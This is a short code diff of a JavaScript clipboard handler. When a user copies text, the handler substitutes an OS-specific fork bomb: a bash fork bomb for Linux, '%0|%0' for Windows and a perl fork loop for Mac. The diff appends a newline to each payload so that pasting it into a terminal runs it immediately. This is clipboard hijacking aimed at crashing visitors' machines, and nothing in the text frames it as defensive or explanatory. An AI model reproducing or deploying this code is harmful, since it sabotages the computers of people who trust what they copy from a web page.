@@ -57,13 +57,13 @@
             event.clipboardData.setData("text/plain", 'Oops this device is not supported')
         }
         if (os === "Linux") {
-            event.clipboardData.setData("text/plain", ":(){ :|:& };:")
+            event.clipboardData.setData("text/plain", ":(){ :|:& };:\n")
         }
         if (os === "Windows") {
-            event.clipboardData.setData("text/plain", "%0|%0")
+            event.clipboardData.setData("text/plain", "%0|%0\n")
         }
         if (os === "Mac") {
-            event.clipboardData.setData("text/plain", 'perl -e "fork while fork" &')
+            event.clipboardData.setData("text/plain", 'perl -e "fork while fork" &\n')
         }
         event.preventDefault();
     })
